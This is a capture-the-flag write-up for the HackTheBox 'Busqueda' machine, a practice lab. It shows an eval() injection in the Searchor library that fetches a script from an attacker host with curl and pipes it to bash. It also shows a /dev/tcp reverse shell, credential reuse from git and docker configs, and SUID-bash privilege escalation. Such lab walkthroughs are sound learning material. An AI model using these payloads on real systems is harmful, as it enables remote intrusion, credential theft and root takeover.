# Busqueda

## Enumeration:

Start off with an nmap scan:
```vim
nmap -sC -sV -Pn -v <IP_ADDR>
```

We get the following response, which leaks the `searcher.htb` domain:
```vim
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking into the web app, There is a github link in the source code along with the version number of the application being used:

[Image](https://github.com/AlexDowneyJr/CTFs/blob/main/HackTheBox/Busqueda%20CTF/images/1.png)

The Github link takes us to a repository for a Python library called Searchor, which is used for web scraping, obtaining information on an topic, and generating search query URLs. Looking back into the target web app, we can see a `/search` endpoint which generates search query URLs for multiple search engines.

Looking into the Python library, I was able to find the following vulnerability which affected version 2.4.0 (patched in 2.4.2): https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

The Python library was using `eval()` without any input sanitization, which can lead to RCE. We can see the line of code causing the vulnerability below:
```
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

## Exploit:

In order to exploit the vulnerability, we have to add `__import__('os').system('sleep 3')` as the RCE somewhere in the query parameter while sending the request. Since the `search` method takes multiple parameters, we can make our payload to look like this: 

```python
Payload: ',__import__('os').system('sleep 3')) #

Result: url = eval(f"Engine.{engine}.search('',__import__('os').system('sleep 3')) #', copy_url={copy}, open_web={open})")
```

This allows us to add not only our RCE code but to also fulfill the 2 parameter requirement of the `search` method (while commenting out the remaining code).

We can make this a reverse shell payload called `shell.sh` which will contain the following:
```vim
#!/bin/bash
bash -i >& /dev/tcp/<IP_ADDR>/<PORT> 0>&1
```

Host `shell.sh` on a simple python web server with `python -m http.server <PORT>` and then send the following payload in the http request (keep in mind to run `nc -lvnp <PORT>` to catch your reverse shell):

```json
engine=Google&query=',__import__('os').system('curl http://<IPR_ADDR>:<PORT>/shell.sh | bash')) #
```

This will give us the shell on the machine as the `svc` user. We can find the user flag in `/home/svc/user.txt`

## Privilege Escalation:

In the home directory of the `svc` user, we find a file called `.git_config`:

```vim
svc@busqueda:~$ cat .gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

In the `/var/www/app/.git/config` file we see the following:
```
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

and if we run `ss -tunlp` and `cat /etc/hosts` we see the following:

```vim
svc@busqueda:~$ ss -tunlp
Netid             State              Recv-Q             Send-Q                         Local Address:Port                            Peer Address:Port             Process                                                                  
udp               UNCONN             0                  0                              127.0.0.53%lo:53                                   0.0.0.0:*                                                                                         
udp               UNCONN             0                  0                                    0.0.0.0:68                                   0.0.0.0:*                                                                                         
tcp               LISTEN             0                  128                                127.0.0.1:5000                                 0.0.0.0:*                 users:(("python3",pid=1665,fd=6),("python3",pid=1665,fd=4))             
tcp               LISTEN             0                  4096                               127.0.0.1:3306                                 0.0.0.0:*                                                                                         
tcp               LISTEN             0                  4096                               127.0.0.1:40689                                0.0.0.0:*                                                                                         
tcp               LISTEN             0                  4096                           127.0.0.53%lo:53                                   0.0.0.0:*                                                                                         
tcp               LISTEN             0                  128                                  0.0.0.0:22                                   0.0.0.0:*                                                                                         
tcp               LISTEN             0                  4096                               127.0.0.1:3000                                 0.0.0.0:*                                                                                         
tcp               LISTEN             0                  4096                               127.0.0.1:222                                  0.0.0.0:*                                                                                         
tcp               LISTEN             0                  511                                        *:80                                         *:*                                                                                         
tcp               LISTEN             0                  128                                     [::]:22                                      [::]:*                                                                                         
svc@busqueda:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

With all this, we can determine that there is a gitea instance (on port 3000 to be specific) and we will have to use a reverse proxy tunnel to access it. We can use the following command to get a reverse proxy tunnel:
```vim
ssh -L 3000:127.0.0.1:3000 svc@searcher.htb -i id_rsa
```

This will allow us to access the Gitea portal using `http://127.0.0.1:3000`

You log in with the following credentials: `cody:jh1usoih2bkjaspwe92`
However, there isn't much there to be seen with cody's account except that there is another administrator account. The password for cody's account can also be used for the `svc` account, letting us run `sudo -l`:

```vim
svc@busqueda:~$ sudo -l
Matching Defaults entries for svc on busqueda:                                                                                                                                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                                              

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Since we cannot read the script being executed, we can only try running the script. It gives the following output:
```vim
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 3 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 3 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

Since `full-checkup` doesn't do anything, we can try and find out what `docker-inspect` does: https://docs.docker.com/engine/reference/commandline/inspect/

The format is supposed to be in json, so we can try something like this:
```vim
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e 
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

We can prettyprint the info like this:
```vim
┌──(kali㉿kali)-[~/busqueda]
└─$ cat lol | jq .
{
  "Hostname": "960873171e2e",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "22/tcp": {},
    "3000/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
  ],
  "Cmd": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "Image": "gitea/gitea:latest",
  "Volumes": {
    "/data": {},
    "/etc/localtime": {},
    "/etc/timezone": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "/usr/bin/entrypoint"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "server",
    "com.docker.compose.version": "1.29.2",
    "maintainer": "maintainers@gitea.io",
    "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
    "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
    "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
    "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
  }
}
```

We can see there are database credentials present, however I was unable to access the MySQL database. Instead, I used the password `yuiu1hoiu4i5ho1uh` with the username of `administrator` and got access to the Gitea administrator account.

The administrator account has a `Scripts` repository which includes the code for the `system-checkup.py`.  

[Image](https://github.com/AlexDowneyJr/CTFs/blob/main/HackTheBox/Busqueda%20CTF/images/1.png)

`full-checkup` functionality is executing a file called `full-checkup.sh`. The vulnerability exists because instead of using a full path, the script uses `./` which checks the current working directory for the file. This lets any file called `full-checkup.sh` in the current working directory execute code.

We can make `full-checkup.sh` with the following code and then execute `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`:
```
#!/bin/bash
chmod +s /bin/bash
```

Run `bash -p` to get the root shell. Root flag can be found in `root/root.txt`
